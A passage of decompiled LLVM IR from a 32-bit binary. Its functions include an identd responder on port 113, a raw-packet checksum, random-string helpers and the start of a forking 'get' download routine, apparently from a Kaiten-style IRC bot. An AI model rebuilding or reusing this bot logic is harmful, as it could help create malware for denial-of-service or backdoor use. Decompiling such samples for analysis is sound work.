  %v0_8048472 = call i32 @random()
  br label %dec_label_pc_80484cd

dec_label_pc_804847c:                             ; preds = %entry
  %v0_804847c = load i64, i64* @global_var_80748f0.34, align 8
  %v1_804847c = trunc i64 %v0_804847c to i32
  %v9_8048481 = icmp eq i32 %v1_804847c, 1
  %v1_8048484 = icmp eq i1 %v9_8048481, false
  br i1 %v1_8048484, label %dec_label_pc_804849c, label %dec_label_pc_8048486

dec_label_pc_8048486:                             ; preds = %dec_label_pc_804847c
  %v2_804848f = call i32 @ntohl(i32 %v1_8048469)
  br label %dec_label_pc_80484cd

dec_label_pc_804849c:                             ; preds = %dec_label_pc_804847c
  %v0_804849c = call i32 @random()
  %v0_80484a3 = load i64, i64* @global_var_80748f0.34, align 8
  %sext = mul i64 %v0_80484a3, 4294967296
  %v5_80484a8 = sdiv i64 %sext, 4294967296
  %v6_80484b2 = zext i32 %v0_804849c to i64
  %v14_80484b2 = urem i64 %v6_80484b2, %v5_80484a8
  %v15_80484b2 = trunc i64 %v14_80484b2 to i32
  %v0_80484b5 = load i8*, i8** @global_var_80748ec.33, align 4
  %v1_80484b5 = ptrtoint i8* %v0_80484b5 to i32
  %v2_80484ba = add i32 %v15_80484b2, 1
  %v1_80484bd = add i32 %v2_80484ba, %v1_80484b5
  %v2_80484c2 = call i32 @ntohl(i32 %v1_80484bd)
  br label %dec_label_pc_80484cd

dec_label_pc_80484cd:                             ; preds = %dec_label_pc_8048486, %dec_label_pc_8048472, %dec_label_pc_804849c
  %stack_var_-8.0 = phi i32 [ %v2_80484c2, %dec_label_pc_804849c ], [ %v2_804848f, %dec_label_pc_8048486 ], [ %v0_8048472, %dec_label_pc_8048472 ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_80484cd, { 2, 0, 1 }
}

define i32 @filter() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v4_8048508 = inttoptr i32 %tmp2 to i8*
  br label %dec_label_pc_80484fa

dec_label_pc_80484db:                             ; preds = %dec_label_pc_804851c, %dec_label_pc_80484fa
  %v3_80484ec = call i32 @_strlen(i8* %v4_8048508)
  %v5_80484f3 = add i32 %tmp2, %v3_80484ec
  %v1_80484f6 = add i32 %v5_80484f3, -1
  %v1_80484f7 = inttoptr i32 %v1_80484f6 to i8*
  store i8 0, i8* %v1_80484f7, align 1
  br label %dec_label_pc_80484fa

dec_label_pc_80484fa:                             ; preds = %entry, %dec_label_pc_80484db
  %v3_804850b = call i32 @_strlen(i8* %v4_8048508)
  %v5_8048512 = add i32 %tmp2, %v3_804850b
  %v1_8048515 = add i32 %v5_8048512, -1
  %v1_8048516 = inttoptr i32 %v1_8048515 to i8*
  %v2_8048516 = load i8, i8* %v1_8048516, align 1
  %v10_8048518 = icmp eq i8 %v2_8048516, 13
  br i1 %v10_8048518, label %dec_label_pc_80484db, label %dec_label_pc_804851c

dec_label_pc_804851c:                             ; preds = %dec_label_pc_80484fa
  %v3_804852d = call i32 @_strlen(i8* %v4_8048508)
  %v5_8048534 = add i32 %tmp2, %v3_804852d
  %v1_8048537 = add i32 %v5_8048534, -1
  %v1_8048538 = inttoptr i32 %v1_8048537 to i8*
  %v2_8048538 = load i8, i8* %v1_8048538, align 1
  %v11_804853a = icmp eq i8 %v2_8048538, 10
  br i1 %v11_804853a, label %dec_label_pc_80484db, label %dec_label_pc_804853e

dec_label_pc_804853e:                             ; preds = %dec_label_pc_804851c
  %v1_8048543 = sext i8 %v2_8048538 to i32
  ret i32 %v1_8048543

; uselistorder directives
  uselistorder i8* %v4_8048508, { 0, 2, 1 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80484fa, { 1, 0 }
}

define i32 @randstring(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %v2_804854f = call i32 @__GI_time(i32* null)
  %v1_804855b = call i32 @srand(i32 %v2_804854f)
  %v4_8048571 = ptrtoint i8* %arg1 to i32
  %v1_8048574 = add i32 %v4_8048571, 1
  %v1_8048579 = call i32 @malloc(i32 %v1_8048574)
  %tmp18 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v1_8048579, i32* %tmp18, align 4
  %v5_8048584 = icmp eq i32 %v1_8048579, 0
  %v1_8048588 = icmp eq i1 %v5_8048584, false
  %tmp28 = inttoptr i32 %v1_8048579 to i8*
  br i1 %v1_8048588, label %dec_label_pc_80485c8.preheader, label %dec_label_pc_80485df

dec_label_pc_80485c8.preheader:                   ; preds = %entry
  %v7_80485ce24 = icmp sgt i8* %arg1, null
  br i1 %v7_80485ce24, label %dec_label_pc_80485a3, label %dec_label_pc_80485d0

dec_label_pc_80485a3:                             ; preds = %dec_label_pc_80485a3, %dec_label_pc_80485c8.preheader
  %v4_80485b8 = phi i8* [ %tmp28, %dec_label_pc_80485c8.preheader ], [ %v4_80485b8.pre, %dec_label_pc_80485a3 ]
  %storemerge625 = phi i32 [ 0, %dec_label_pc_80485c8.preheader ], [ %v4_80485c5, %dec_label_pc_80485a3 ]
  %v0_80485a3 = call i32 @random()
  %v1_80485a3 = sext i32 %v0_80485a3 to i64
  %v15_80485ad = urem i64 %v1_80485a3, 62
  %v16_80485ad = trunc i64 %v15_80485ad to i32
  %v5_80485b8 = ptrtoint i8* %v4_80485b8 to i32
  %v6_80485b8 = add i32 %v5_80485b8, %storemerge625
  %v6_80485be = add i32 %v16_80485ad, ptrtoint ([63 x i8]* @global_var_806886c.35 to i32)
  %v1_80485c1 = inttoptr i32 %v6_80485be to i8*
  %v2_80485c1 = load i8, i8* %v1_80485c1, align 1
  %v3_80485c3 = inttoptr i32 %v6_80485b8 to i8*
  store i8 %v2_80485c1, i8* %v3_80485c3, align 1
  %v4_80485c5 = add i32 %storemerge625, 1
  %v6_80485cb = inttoptr i32 %v4_80485c5 to i8*
  %v7_80485ce = icmp slt i8* %v6_80485cb, %arg1
  %v4_80485b8.pre = load i8*, i8** %stack_var_-16, align 4
  br i1 %v7_80485ce, label %dec_label_pc_80485a3, label %dec_label_pc_80485d0

dec_label_pc_80485d0:                             ; preds = %dec_label_pc_80485a3, %dec_label_pc_80485c8.preheader
  %v4_80485d3 = phi i8* [ %tmp28, %dec_label_pc_80485c8.preheader ], [ %v4_80485b8.pre, %dec_label_pc_80485a3 ]
  %v5_80485d3 = ptrtoint i8* %v4_80485d3 to i32
  %v6_80485d3 = add i32 %v5_80485d3, %v4_8048571
  %v1_80485d6 = inttoptr i32 %v6_80485d3 to i8*
  store i8 0, i8* %v1_80485d6, align 1
  %v3_80485d9 = load i8*, i8** %stack_var_-16, align 4
  %v4_80485d9 = ptrtoint i8* %v3_80485d9 to i32
  br label %dec_label_pc_80485df

dec_label_pc_80485df:                             ; preds = %entry, %dec_label_pc_80485d0
  %storemerge = phi i32 [ %v4_80485d9, %dec_label_pc_80485d0 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80485c5, { 1, 0 }
  uselistorder i32 %v1_8048579, { 0, 2, 1 }
  uselistorder i8** %stack_var_-16, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80485df, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1260 = alloca i32, align 4
  store i32 2, i32* %stack_var_-1260, align 4
  %v3_80485f7 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_8048602 = icmp eq i32 %v3_80485f7, -1
  br i1 %v13_8048602, label %dec_label_pc_8048821, label %dec_label_pc_804860c

dec_label_pc_804860c:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 113, i32* %stack_var_-1260, align 4
  %v1_8048617 = call i32 @htons(i32 113)
  %v2_804862a = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v3_8048649 = call i32 @bind(i32 %v3_80485f7, i32 %v2_804862a, i32 16)
  %v10_8048651 = icmp eq i32 %v3_8048649, -1
  br i1 %v10_8048651, label %dec_label_pc_8048821, label %dec_label_pc_804865a

dec_label_pc_804865a:                             ; preds = %dec_label_pc_804860c
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v2_8048662 = call i32 @listen(i32 %v3_80485f7, i32 1)
  %v10_804866a = icmp eq i32 %v2_8048662, -1
  br i1 %v10_804866a, label %dec_label_pc_8048821, label %dec_label_pc_8048673

dec_label_pc_8048673:                             ; preds = %dec_label_pc_804865a
  %v0_8048673 = load i32, i32* %stack_var_-1260, align 4
  %v1_8048673 = call i32 @fork(i32 %v0_8048673)
  %v1_8048678 = icmp eq i32 %v1_8048673, 0
  br i1 %v1_8048678, label %dec_label_pc_8048821, label %dec_label_pc_8048680

dec_label_pc_8048680:                             ; preds = %dec_label_pc_8048673
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048687 = ptrtoint i32* %stack_var_-36 to i32
  %v2_804868a = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v3_80485f7, i32* %stack_var_-1260, align 4
  %v3_8048695 = call i32 @accept(i32 %v3_80485f7, i32 %v2_804868a, i32 %v2_8048687)
  %v4_80486a0 = add i32 %v3_8048695, 1
  %v13_80486a0 = icmp eq i32 %v4_80486a0, 0
  %v1_80486a4 = icmp eq i1 %v13_80486a0, false
  br i1 %v1_80486a4, label %dec_label_pc_80486b0.preheader, label %dec_label_pc_80486a6

dec_label_pc_80486a6:                             ; preds = %dec_label_pc_8048680
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80486ab = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80486b0.preheader

dec_label_pc_80486b0.preheader:                   ; preds = %dec_label_pc_80486a6, %dec_label_pc_8048680
  %v2_80486ba = ptrtoint i32* %stack_var_-1228 to i32
  %tmp35 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80486ce = udiv i32 %v3_8048695, 32
  %v1_80486d4 = urem i32 %v3_8048695, 32
  %v9_80486d7 = shl i32 1, %v1_80486d4
  %v2_80486fc = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048733 = mul nuw nsw i32 %v2_80486ce, 4
  %v3_8048733 = add nsw i32 %v2_8048733, -1224
  br label %dec_label_pc_80486b0

dec_label_pc_80486b0:                             ; preds = %dec_label_pc_80486b0.preheader, %dec_label_pc_8048725
  store i32 %v2_80486ba, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80486c1 = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  %v0_80486d7 = load i32, i32* @ebp, align 4
  %v4_80486d7 = add i32 %v3_8048733, %v0_80486d7
  %v5_80486d7 = inttoptr i32 %v4_80486d7 to i32*
  %v6_80486d7 = load i32, i32* %v5_80486d7, align 4
  %v12_80486d7 = or i32 %v6_80486d7, %v9_80486d7
  store i32 %v12_80486d7, i32* %v5_80486d7, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  store i32 %v2_80486fc, i32* %stack_var_-1260, align 4
  %v5_804870f = call i32 @__libc_select(i32 %v4_80486a0, i32 %v2_80486ba, i32 0, i32 0, i32 %v2_80486fc)
  %v2_8048717 = icmp slt i32 %v5_804870f, 0
  %v1_8048719 = icmp eq i1 %v2_8048717, false
  br i1 %v1_8048719, label %dec_label_pc_8048725, label %dec_label_pc_804871b

dec_label_pc_804871b:                             ; preds = %dec_label_pc_80486b0
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_8048720 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048725

dec_label_pc_8048725:                             ; preds = %dec_label_pc_80486b0, %dec_label_pc_804871b
  %v0_8048733 = load i32, i32* @ebp, align 4
  %v4_8048733 = add i32 %v3_8048733, %v0_8048733
  %v5_8048733 = inttoptr i32 %v4_8048733 to i32*
  %v6_8048733 = load i32, i32* %v5_8048733, align 4
  %v10_8048733 = and i32 %v6_8048733, %v9_80486d7
  %v11_8048733 = icmp ne i32 %v10_8048733, 0
  %v4_804873e = icmp eq i1 %v11_8048733, false
  %v1_8048740 = icmp eq i1 %v4_804873e, false
  br i1 %v1_8048740, label %dec_label_pc_8048747, label %dec_label_pc_80486b0

dec_label_pc_8048747:                             ; preds = %dec_label_pc_8048725
  %v2_804874e = ptrtoint i32* %stack_var_-1092 to i32
  %v4_8048758 = call i32 @recv(i32 %v3_8048695, i32 %v2_804874e, i32 1024, i32 0)
  %tmp36 = icmp slt i32 %v4_8048758, 1
  br i1 %tmp36, label %dec_label_pc_804876f, label %dec_label_pc_8048769

dec_label_pc_8048769:                             ; preds = %dec_label_pc_8048747
  %v7_804876d = icmp sgt i32 %v4_8048758, 19
  br i1 %v7_804876d, label %dec_label_pc_804876f, label %dec_label_pc_8048779

dec_label_pc_804876f:                             ; preds = %dec_label_pc_8048769, %dec_label_pc_8048747
  %v1_8048774 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048779

dec_label_pc_8048779:                             ; preds = %dec_label_pc_8048769, %dec_label_pc_804876f
  %v0_804877c = load i32, i32* @ebp, align 4
  %v2_804877c = add i32 %v4_8048758, -1088
  %v3_804877c = add i32 %v2_804877c, %v0_804877c
  %v4_804877c = inttoptr i32 %v3_804877c to i8*
  store i8 0, i8* %v4_804877c, align 1
  %v0_8048788 = load i32, i32* @ebp, align 4
  %v2_8048788 = add i32 %v4_8048758, -1089
  %v3_8048788 = add i32 %v2_8048788, %v0_8048788
  %v4_8048788 = inttoptr i32 %v3_8048788 to i8*
  %v5_8048788 = load i8, i8* %v4_8048788, align 1
  %v10_804878f = icmp eq i8 %v5_8048788, 10
  br i1 %v10_804878f, label %dec_label_pc_80487a2, label %dec_label_pc_8048793

dec_label_pc_8048793:                             ; preds = %dec_label_pc_8048779
  %v5_8048797 = load i8, i8* %v4_8048788, align 1
  %v10_804879e = icmp eq i8 %v5_8048797, 13
  %v1_80487a0 = icmp eq i1 %v10_804879e, false
  br i1 %v1_80487a0, label %dec_label_pc_80487ae, label %dec_label_pc_80487a2

dec_label_pc_80487a2:                             ; preds = %dec_label_pc_8048793, %dec_label_pc_8048779
  store i8 0, i8* %v4_8048788, align 1
  %v0_80487b4.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80487ae

dec_label_pc_80487ae:                             ; preds = %dec_label_pc_8048793, %dec_label_pc_80487a2
  %v0_80487d6 = phi i32 [ %v0_8048788, %dec_label_pc_8048793 ], [ %v0_80487b4.pre, %dec_label_pc_80487a2 ]
  %v2_80487b4 = add i32 %v4_8048758, -1090
  %v3_80487b4 = add i32 %v2_80487b4, %v0_80487d6
  %v4_80487b4 = inttoptr i32 %v3_80487b4 to i8*
  %v5_80487b4 = load i8, i8* %v4_80487b4, align 1
  %v10_80487bb = icmp eq i8 %v5_80487b4, 10
  br i1 %v10_80487bb, label %dec_label_pc_80487d0, label %dec_label_pc_80487bf

dec_label_pc_80487bf:                             ; preds = %dec_label_pc_80487ae
  %v5_80487c5 = load i8, i8* %v4_80487b4, align 1
  %v10_80487cc = icmp eq i8 %v5_80487c5, 13
  %v1_80487ce = icmp eq i1 %v10_80487cc, false
  br i1 %v1_80487ce, label %dec_label_pc_80487de, label %dec_label_pc_80487d0

dec_label_pc_80487d0:                             ; preds = %dec_label_pc_80487bf, %dec_label_pc_80487ae
  store i8 0, i8* %v4_80487b4, align 1
  br label %dec_label_pc_80487de

dec_label_pc_80487de:                             ; preds = %dec_label_pc_80487bf, %dec_label_pc_80487d0
  %v3_80487f3 = call i32 @Send(i32 %v3_8048695, i32 ptrtoint ([25 x i8]* @global_var_80688ab.37 to i32))
  %v1_8048801 = call i32 @close(i32 %v3_8048695)
  %v1_804880f = call i32 @close(i32 %v3_80485f7)
  %v1_804881c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048821

dec_label_pc_8048821:                             ; preds = %dec_label_pc_8048673, %dec_label_pc_804865a, %dec_label_pc_804860c, %entry, %dec_label_pc_80487de
  %v0_8048825 = phi i32 [ 0, %dec_label_pc_8048673 ], [ %v2_8048662, %dec_label_pc_804865a ], [ %v3_8048649, %dec_label_pc_804860c ], [ %v3_80485f7, %entry ], [ %v1_804881c, %dec_label_pc_80487de ]
  ret i32 %v0_8048825

; uselistorder directives
  uselistorder i32 %v4_8048758, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_8048733, { 1, 0 }
  uselistorder i32 %v3_8048695, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_8048662, { 1, 0 }
  uselistorder i32 %v3_8048649, { 1, 0 }
  uselistorder i32 %v3_80485f7, { 1, 8, 6, 7, 4, 5, 2, 3, 0 }
  uselistorder i32* %stack_var_-1260, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_8048821, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80487de, { 1, 0 }
  uselistorder label %dec_label_pc_80487ae, { 1, 0 }
  uselistorder label %dec_label_pc_8048779, { 1, 0 }
  uselistorder label %dec_label_pc_8048725, { 1, 0 }
  uselistorder label %dec_label_pc_80486b0, { 1, 0 }
}

define i32 @poww(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048826 = load i32, i32* @ebp, align 4
  store i32 %v0_8048826, i32* %stack_var_-4, align 4
  %v4_8048826 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048826, i32* @ebp, align 4
  %v4_804882c = icmp eq i32 %arg2, 0
  %v1_8048830 = icmp eq i1 %v4_804882c, false
  br i1 %v1_8048830, label %dec_label_pc_804883b, label %dec_label_pc_8048832

dec_label_pc_8048832:                             ; preds = %entry
  br label %dec_label_pc_8048865

dec_label_pc_804883b:                             ; preds = %entry
  %v4_804883b = add i32 %arg2, -1
  %v12_804883b = icmp eq i32 %v4_804883b, 0
  %v1_804883f = icmp eq i1 %v12_804883b, false
  br i1 %v1_804883f, label %dec_label_pc_8048849, label %dec_label_pc_8048841

dec_label_pc_8048841:                             ; preds = %dec_label_pc_804883b
  %v4_8048841 = trunc i64 %arg1 to i32
  br label %dec_label_pc_8048865

dec_label_pc_8048849:                             ; preds = %dec_label_pc_804883b
  %v4_8048854 = call i32 @poww(i64 %arg1, i32 %v4_804883b)
  %v6_804885e = sext i32 %v4_8048854 to i64
  %v8_804885e = mul nsw i64 %v6_804885e, %arg1
  %v9_804885e = trunc i64 %v8_804885e to i32
  br label %dec_label_pc_8048865

dec_label_pc_8048865:                             ; preds = %dec_label_pc_8048841, %dec_label_pc_8048832, %dec_label_pc_8048849
  %v3_8048865.off0 = phi i32 [ %v4_8048841, %dec_label_pc_8048841 ], [ 1, %dec_label_pc_8048832 ], [ %v9_804885e, %dec_label_pc_8048849 ]
  ret i32 %v3_8048865.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8048865, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804886a = load i32, i32* @ebp, align 4
  %v4_80488a123 = add i32 %arg2, -1
  %v9_80488a124 = sub i32 0, %arg2
  %v10_80488a125 = and i32 %arg2, %v9_80488a124
  %v11_80488a126 = icmp slt i32 %v10_80488a125, 0
  %v12_80488a127 = icmp eq i32 %v4_80488a123, 0
  %v13_80488a128 = icmp slt i32 %v4_80488a123, 0
  %v3_80488a529 = icmp eq i1 %v13_80488a128, %v11_80488a126
  %v4_80488a530 = icmp eq i1 %v12_80488a127, false
  %v5_80488a531 = and i1 %v4_80488a530, %v3_80488a529
  br i1 %v5_80488a531, label %dec_label_pc_804888b, label %dec_label_pc_80488a7

dec_label_pc_804888b:                             ; preds = %entry, %dec_label_pc_804888b
  %stack_var_-24.034 = phi i16 [ %v6_8048896, %dec_label_pc_804888b ], [ 0, %entry ]
  %stack_var_-28.033 = phi i16* [ %v23_8048899, %dec_label_pc_804888b ], [ %arg1, %entry ]
  %v3_804889d32 = phi i32 [ %v4_804889d, %dec_label_pc_804888b ], [ %arg2, %entry ]
  %v4_804888b = ptrtoint i16* %stack_var_-28.033 to i32
  %v2_804888e = load i16, i16* %stack_var_-28.033, align 2
  %v6_8048896 = add i16 %v2_804888e, %stack_var_-24.034
  %v5_8048899 = add i32 %v4_804888b, 2
  %v23_8048899 = inttoptr i32 %v5_8048899 to i16*
  %v4_804889d = add i32 %v3_804889d32, -2
  %v4_80488a1 = add i32 %v3_804889d32, -3
  %v9_80488a1 = sub i32 2, %v3_804889d32
  %v10_80488a1 = and i32 %v4_804889d, %v9_80488a1
  %v11_80488a1 = icmp slt i32 %v10_80488a1, 0
  %v12_80488a1 = icmp eq i32 %v4_80488a1, 0
  %v13_80488a1 = icmp slt i32 %v4_80488a1, 0
  %v3_80488a5 = icmp eq i1 %v13_80488a1, %v11_80488a1
  %v4_80488a5 = icmp eq i1 %v12_80488a1, false
  %v5_80488a5 = and i1 %v4_80488a5, %v3_80488a5
  br i1 %v5_80488a5, label %dec_label_pc_804888b, label %dec_label_pc_80488a7

dec_label_pc_80488a7:                             ; preds = %dec_label_pc_804888b, %entry
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8048899, %dec_label_pc_804888b ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v6_8048896, %dec_label_pc_804888b ]
  %v4_80488a5.lcssa = phi i1 [ %v4_80488a530, %entry ], [ %v4_80488a5, %dec_label_pc_804888b ]
  br i1 %v4_80488a5.lcssa, label %dec_label_pc_80488c3, label %dec_label_pc_80488ad

dec_label_pc_80488ad:                             ; preds = %dec_label_pc_80488a7
  %v4_80488b0 = ptrtoint i16* %stack_var_-28.0.lcssa to i32
  %v1_80488b3 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80488b3 = load i8, i8* %v1_80488b3, align 1
  %v3_80488b3 = zext i8 %v2_80488b3 to i32
  %v5_80488b3 = and i32 %v4_80488b0, -256
  %v6_80488b3 = or i32 %v3_80488b3, %v5_80488b3
  %v4_80488b710 = urem i32 %v6_80488b3, 65536
  %v4_80488c043 = zext i16 %stack_var_-24.0.lcssa to i32
  %v6_80488c0 = add nuw nsw i32 %v4_80488b710, %v4_80488c043
  %v26_80488c0 = trunc i32 %v6_80488c0 to i16
  br label %dec_label_pc_80488c3

dec_label_pc_80488c3:                             ; preds = %dec_label_pc_80488a7, %dec_label_pc_80488ad
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488a7 ], [ %v26_80488c0, %dec_label_pc_80488ad ]
  %v4_80488c3 = sext i16 %stack_var_-24.1 to i32
  %v2_80488c6 = sdiv i32 %v4_80488c3, 65536
  %v2_80488cd = add nsw i32 %v2_80488c6, %v4_80488c3
  %sext4 = mul i32 %v2_80488cd, 65536
  %v2_80488d5 = ashr i32 %sext4, 31
  %v6_80488d812 = mul nsw i32 %v2_80488d5, 65536
  %v4_80488d21113 = add i32 %v6_80488d812, %sext4
  %v4_80488db22 = udiv i32 %v4_80488d21113, 65536
  %v1_80488e8 = xor i32 %v4_80488db22, 65535
  store i32 %v0_804886a, i32* @ebp, align 4
  ret i32 %v1_80488e8

; uselistorder directives
  uselistorder i32 %sext4, { 1, 0 }
  uselistorder i32 %v4_80488c3, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488a1, { 1, 0 }
  uselistorder i32 %v4_804889d, { 1, 0 }
  uselistorder label %dec_label_pc_80488c3, { 1, 0 }
  uselistorder label %dec_label_pc_804888b, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-5244 = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %v5_80488fa = icmp ult i32* %stack_var_-5228, inttoptr (i32 12 to i32*)
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  store i32 %arg2, i32* %stack_var_-5244, align 4
  %v7_80488fd = ptrtoint i32* %stack_var_-5244 to i32
  %v1_8048900 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048908 = icmp eq i32 %v1_8048900, 0
  %v1_804890a = icmp eq i1 %v1_8048908, false
  br i1 %v1_804890a, label %dec_label_pc_8048dc8, label %dec_label_pc_8048910

dec_label_pc_8048910:                             ; preds = %entry
  %v12_80488f4 = ptrtoint i32* %stack_var_-5228 to i32
  %v4_8048910 = add i32 %arg3, -1
  %v8_8048910 = icmp eq i32 %arg3, 0
  %v9_8048910 = sub i32 0, %arg3
  %v10_8048910 = and i32 %arg3, %v9_8048910
  %v11_8048910 = icmp slt i32 %v10_8048910, 0
  store i1 %v8_8048910, i1* %cf.global-to-local, align 1
  %v12_8048910 = icmp eq i32 %v4_8048910, 0
  %v13_8048910 = icmp slt i32 %v4_8048910, 0
  %v3_8048914 = icmp eq i1 %v13_8048910, %v11_8048910
  %v4_8048914 = icmp eq i1 %v12_8048910, false
  %v5_8048914 = and i1 %v4_8048914, %v3_8048914
  br i1 %v5_8048914, label %dec_label_pc_8048936, label %dec_label_pc_8048916

dec_label_pc_8048916:                             ; preds = %dec_label_pc_8048910
  %v5_8048916 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048916, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_8048924 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_80688c4.38 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5244, align 4
  %v1_8048931 = call i32 @__GI_exit(i32 0)
  %v0_8048936.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048936

dec_label_pc_8048936:                             ; preds = %dec_label_pc_8048910, %dec_label_pc_8048916
  %v0_8048936 = phi i32 [ %v0_8048936.pre, %dec_label_pc_8048916 ], [ %v12_80488f4, %dec_label_pc_8048910 ]
  %v5_8048936 = icmp ult i32 %v0_8048936, 4
  store i1 %v5_8048936, i1* %cf.global-to-local, align 1
  store i32 2, i32* %stack_var_-5244, align 4
  %v4_804893f = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_804894a = icmp ne i32 %v4_804893f, -1
  store i1 %v8_804894a, i1* %cf.global-to-local, align 1
  %v13_804894a = icmp eq i32 %v4_804893f, -1
  %v1_804894e = icmp eq i1 %v13_804894a, false
  br i1 %v1_804894e, label %dec_label_pc_8048970, label %dec_label_pc_8048950

dec_label_pc_8048950:                             ; preds = %dec_label_pc_8048936
  %v5_8048950 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048950, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_804895e = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80688e8.39 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5244, align 4
  %v1_804896b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048970

dec_label_pc_8048970:                             ; preds = %dec_label_pc_8048936, %dec_label_pc_8048950
  %v1_8048973 = add i32 %arg4, 4
  %v5_8048973 = icmp ugt i32 %arg4, -5
  store i1 %v5_8048973, i1* %cf.global-to-local, align 1
  %v1_8048976 = inttoptr i32 %v1_8048973 to i32*
  %v2_8048976 = load i32, i32* %v1_8048976, align 4
  store i1 false, i1* @df, align 1
  %v4_8048993 = inttoptr i32 %v2_8048976 to i8*
  store i32 %v2_8048976, i32* @esi, align 4
  %v7_80489a5 = call i32 @_strncmp(i8* %v4_8048993, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806890d.40, i32 0, i32 0), i32 7)
  %v8_80489a5 = urem i32 %v7_80489a5, 2
  %v9_80489a5 = icmp eq i32 %v8_80489a5, 0
  %v0_80489a7 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489a7 = or i1 %v0_80489a7, %v9_80489a5
  %v3_80489a7 = zext i1 %v2_80489a7 to i32
  %v4_80489a7 = load i32, i32* @edx, align 4
  %v5_80489a7 = and i32 %v4_80489a7, -256
  %v6_80489a7 = or i32 %v3_80489a7, %v5_80489a7
  %v7_80489a7 = xor i32 %v6_80489a7, 1
  store i32 %v7_80489a7, i32* %edx.global-to-local, align 4
  %v1_80489af = trunc i32 %v7_80489a7 to i8
  %v3_80489af = zext i1 %v0_80489a7 to i8
  %v15_80489af = icmp eq i8 %v1_80489af, %v3_80489af
  %v1_80489b8 = icmp eq i1 %v15_80489af, false
  store i1 %v5_8048973, i1* %cf.global-to-local, align 1
  %v2_80489e0 = load i32, i32* %v1_8048976, align 4
  br i1 %v1_80489b8, label %dec_label_pc_80489da, label %dec_label_pc_80489ba

dec_label_pc_80489ba:                             ; preds = %dec_label_pc_8048970
  %v1_80489c2 = add i32 %v2_80489e0, 7
  %v0_80489c5 = load i32, i32* @esp, align 4
